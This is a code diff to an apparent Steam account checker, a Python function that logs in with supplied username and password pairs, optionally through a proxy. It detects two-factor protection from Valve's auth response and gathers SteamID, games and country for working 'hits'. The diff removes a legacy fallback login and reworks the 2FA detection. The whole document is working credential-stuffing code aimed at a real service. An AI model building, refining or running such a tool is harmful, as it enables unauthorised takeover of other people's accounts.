@@ -1389,7 +1389,7 @@ def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str
     return base64.b64encode(hex_bytes).decode('ascii')
 
 def check_steam(username: str, password: str, proxy=None) -> dict:
-    """Steam Checker - Hybrid 2FA detection (Modern Protobuf + Legacy emailauth_needed)"""
+    """Steam Checker - Fixed 2FA detection (stricter, no more false positives)"""
     result = {
         'email': username,
         'password': password,
@@ -1439,7 +1439,7 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
             result['message'] = "RSA encryption failed"
             return result
 
-        # 3. Modern Protobuf Auth Session
+        # 3. Begin Auth Session (Modern Protobuf)
         auth_req = CAuthentication_BeginAuthSessionViaCredentials_Request()
         auth_req.account_name = username
         auth_req.device_friendly_name = ""
@@ -1473,50 +1473,26 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         x_eresult = resp.headers.get('X-eresult', '')
         print(f"[DEBUG Steam] {username} | X-eresult: {x_eresult}")
 
-        # ==================== HYBRID 2FA DETECTION ====================
+        # ==================== FIXED 2FA DETECTION ====================
         is_twofa = False
 
-        # A. Modern protobuf detection
         try:
             auth_resp = CAuthentication_BeginAuthSessionViaCredentials_Response()
             auth_resp.ParseFromString(resp.content)
+
+            # Official Valve field - this is the most accurate way
             if hasattr(auth_resp, 'allowed_confirmations') and len(auth_resp.allowed_confirmations) > 0:
                 is_twofa = True
-                print(f"[DEBUG Steam] → 2FA detected via protobuf (allowed_confirmations)")
+                confirmation_types = [c.confirmation_type for c in auth_resp.allowed_confirmations]
+                print(f"[DEBUG Steam] → 2FA DETECTED via protobuf! Types: {confirmation_types}")
+
             if hasattr(auth_resp, 'steamid') and auth_resp.steamid:
                 result['steamid'] = str(auth_resp.steamid)
+
         except Exception as e:
             print(f"[DEBUG Steam] Protobuf parse failed: {e}")
 
-        # B. Legacy detection (exactly like your working standalone script)
-        if not is_twofa:
-            try:
-                legacy_data = {
-                    "username": username,
-                    "password": encrypted_b64,
-                    "emailauth": "",
-                    "loginfriendlyname": "",
-                    "captchagid": "-1",
-                    "captcha_text": "",
-                    "emailsteamid": "",
-                    "rsatimestamp": timestamp,
-                    "remember_login": False,
-                    "donotcache": str(int(time.time() * 1000)),
-                }
-                legacy_resp = session.post(
-                    "https://steamcommunity.com/login/dologin/",
-                    data=legacy_data,
-                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
-                    timeout=15
-                )
-                data2 = legacy_resp.json()
-                if data2.get("emailauth_needed"):
-                    is_twofa = True
-                    print(f"[DEBUG Steam] → 2FA detected via legacy emailauth_needed (this is what worked in your standalone script)")
-            except Exception as e:
-                print(f"[DEBUG Steam] Legacy 2FA check failed: {e}")
-
-        # Final decision
+        # ==================== FINAL DECISION ====================
         if is_twofa:
             result['twofa'] = True
             result['success'] = True
@@ -1532,10 +1508,11 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
             result['message'] = f"Unknown error (eresult: {x_eresult})"
             return result
 
-        # ==================== EXTRA RICH DATA (Games, Country, etc.) ====================
-        # This now runs for BOTH normal hits AND 2FA accounts
+        # ==================== RICH DATA (Games, Country, etc.) ====================
+        # Runs for BOTH normal hits AND 2FA accounts
         if result['steamid'] != 'N/A':
             try:
+                # Player Summary
                 summary_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={STEAM_API_KEY}&steamids={result['steamid']}"
                 summary_resp = requests.get(summary_url, timeout=15)
                 if summary_resp.status_code == 200:
